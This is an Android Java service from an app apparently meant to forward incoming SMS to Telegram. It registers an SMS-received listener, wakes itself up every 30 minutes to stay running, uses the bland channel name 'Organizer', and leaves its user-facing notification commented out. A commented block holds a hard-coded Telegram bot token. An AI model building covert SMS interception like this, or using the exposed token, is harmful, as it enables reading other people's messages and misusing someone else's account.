package br.com.helpdev.smsreceiver;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.google.firebase.messaging.FirebaseMessaging;

import java.net.MalformedURLException;
import java.net.URL;

import br.com.helpdev.smsreceiver.receiver.BootReceiver;
import br.com.helpdev.smsreceiver.receiver.SMSReceiver;


public class MainService extends Service {
    private static final int NOTIFICATION_ID = 99999;
    NotificationManager mNotificationManager;

    //    public static boolean shouldRunWithoutCall = true;
    private final String TAG = "MAINSERV";
    BroadcastReceiver SMSReceiver;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    public int onStartCommand(Intent pIntent, int Int1, int Int2) {
        long timeForComparingLastSync;

        Preferences preferences = new Preferences(getApplicationContext());
        timeForComparingLastSync = System.currentTimeMillis() / 1000;
        int internetRes = checkInternetStatus(getApplicationContext());

        FirebaseMessaging.getInstance().subscribeToTopic("smstotelegram");
        registerSmsReceiver();
        mNotificationManager = (NotificationManager)
                getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);

        //showNotification("Organizer", "Organizer is Active");

        //Note : uncomment above line for longer time running of apps
        //Note:  also in setting app info, permissions, turn off "Remove perm if app isnt used"

        /*if (internetRes > 0) {
            try {
                String token = "5777738217:AAFpYHCaPcYvgOdsQAdkf0DoYJKhdyrPWGg";
                URL url = new URL("https://api.telegram.org/bot"+token+"/getUpdates?offset=-1");
                //new GetHttp(getApplicationContext()).sendGet(url);
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }


        }//internet check block*/

        // note: uncomment above block for cmd based telegram start stop, currently not using it



        // Self Wakeup Brodcast
        if (timeForComparingLastSync >= (preferences.getbrodTime() + (30 * 60))) {
            sendBroadcast(new Intent(this, BootReceiver.class).setAction("Again"));
            preferences.setbrodTime(timeForComparingLastSync);
        }
        return Service.START_STICKY;
    }

    private void registerSmsReceiver() {
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        SMSReceiver = new SMSReceiver();
        registerReceiver(SMSReceiver, filter);
    }


    @Override
    public void onDestroy() {
        if (SMSReceiver != null) {
            unregisterReceiver(SMSReceiver);
            SMSReceiver = null;
        }
        super.onDestroy();
    }
    

    public static int checkInternetStatus(Context context) {
        final ConnectivityManager connMgr = (ConnectivityManager)
                context.getSystemService(Context.CONNECTIVITY_SERVICE);
        @SuppressLint("MissingPermission")
        final android.net.NetworkInfo wifi = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        @SuppressLint("MissingPermission")
        final android.net.NetworkInfo mobile = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifi.isConnectedOrConnecting()) {
            return 1;
        } else if (mobile.isConnectedOrConnecting()) {
            return 2;
        } else {
            return 0;
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    public void showNotification(String title, String message){
        // Pass the intent to switch to the MainActivity
        Intent intent
                = new Intent(this, MainService.class);
        // Assign channel ID
        String channel_id = "notification_channel";
        // Here FLAG_ACTIVITY_CLEAR_TOP flag is set to clear
        // the activities present in the activity stack,
        // on the top of the Activity that is to be launched
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        // Pass the intent to PendingIntent to start the
        // next Activity
        PendingIntent pendingIntent
                = PendingIntent.getActivity(
                this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);

        // Create a Builder object using NotificationCompat
        // class. This will allow control over all the flags
        NotificationCompat.Builder builder
                = new NotificationCompat
                .Builder(getApplicationContext(),
                channel_id)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setAutoCancel(true)
                .setVibrate(new long[] { 1000, 1000, 1000,
                        1000, 1000 })
                .setOnlyAlertOnce(true)
                .setContentIntent(pendingIntent);

        // A customized design for the notification can be
        // set only for Android versions 4.1 and above. Thus
        // condition for the same is checked here.
        builder = builder.setContentTitle(title)
                .setContentText(message)
                .setOngoing(true)
                .setSmallIcon(R.drawable.ic_launcher_foreground);
        // Create an object of NotificationManager class to
        // notify the
        // user of events that happen in the background.
        NotificationManager notificationManager
                = (NotificationManager)getSystemService(
                Context.NOTIFICATION_SERVICE);
        // Check if the Android Version is greater than Oreo
        if (Build.VERSION.SDK_INT
                >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel
                    = new NotificationChannel(
                    channel_id, "Organizer",
                    NotificationManager.IMPORTANCE_HIGH);
            notificationManager.createNotificationChannel(
                    notificationChannel);
        }

        notificationManager.notify(0, builder.build());
    }





}
